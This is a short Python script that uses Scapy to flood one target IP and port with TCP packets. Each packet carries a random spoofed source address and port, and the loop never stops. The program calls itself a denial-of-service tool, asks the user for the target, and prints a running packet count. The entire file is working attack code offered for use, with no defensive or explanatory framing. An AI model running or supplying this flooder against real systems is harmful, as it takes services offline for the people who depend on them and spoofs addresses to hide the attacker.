#!/usr/bin/env python3

import random
import time
import sys

try:
    #
    from scapy.all import *
    #
except:
    #
    sys.exit("[!] This script requires Scapy ")

def RandomIP():
    #
    random_addr = ""
    #
    for i in range(1,4):
        #
        value = random.randint(1,255)
        #
        random_addr += str(value)+'.'
        #
    random_addr = random_addr+str(random.randint(1,255))
    #
    return random_addr

def main():
    #
    print(
        '''
        <-- Single Host Single Port Denial of Service -->
        '''
    )
    #
    target = input("[+] Enter the target IP-> ")
    #
    target_port = int(input("[+] Enter the target port-> "))
    #
    pkt_count = 0
    #
    print("[*] Target: %s : %i " % (target,target_port))
    #
    print("*** Beginning Denial of Service ***")
    #
    while(True):
        #
        source_ip = RandomIP()
        #
        source_port = random.randint(1,65536)
        #
        ip_header = IP(src=source_ip,dst=target)
        #
        tcp_header = TCP(sport=source_port,dport=target_port)
        #
        packet = ip_header/tcp_header
        #
        send(packet,inter=.001,verbose=False)
        #
        print("[*] %s : %i sent packet to -> %s : %i  | Total Packets: %i " % (source_ip,source_port,target,target_port,pkt_count))
        #
        pkt_count = pkt_count+1

if(__name__ == '__main__'):
    #
    main()
